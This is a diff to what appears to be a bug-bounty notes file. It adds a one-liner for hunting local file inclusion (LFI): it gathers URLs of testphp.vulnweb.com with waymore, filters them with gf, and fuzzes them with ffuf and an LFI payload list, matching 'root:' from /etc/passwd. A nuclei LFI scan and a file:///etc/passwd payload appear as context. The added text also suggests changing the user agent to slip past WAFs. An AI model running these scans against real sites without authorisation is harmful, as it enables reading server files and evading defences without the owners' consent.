@@ -78,6 +78,14 @@ cat allurls.txt | gf lfi | nuclei -tags Lfi
 
 file:///etc/passwd
 
+Example 1:
+--try this amazingg LFI oneliner its veryfast and effective also change ffuf useragent so its dont get blocked by waf's
+waymore -i "testphp.vulnweb.com" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
+
+waymore -i "testphp.vulnweb.com" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | tee testphp.vulnweb.com.lfi.txt
+
+cat testphp.vulnweb.com.lfi.txt | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
+
 XSS
 -------------
 https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide
